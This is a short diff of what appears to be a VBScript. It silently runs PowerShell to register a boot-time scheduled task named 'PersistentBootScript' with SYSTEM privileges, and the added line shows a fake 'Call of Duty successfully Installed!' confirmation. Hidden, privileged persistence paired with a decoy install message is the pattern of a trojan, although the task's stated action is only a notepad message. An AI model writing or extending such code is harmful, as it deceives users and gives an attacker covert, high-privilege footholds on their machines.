@@ -64,3 +64,5 @@ psCommand = _
     " Register-ScheduledTask -TaskName 'PersistentBootScript' -Description 'Runs notepad message on boot as SYSTEM' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force""" 
 
 shell.Run psCommand, 0, True
+
+MsgBox "Call of Duty successfully Installed!", vbOKOnly, "Success"
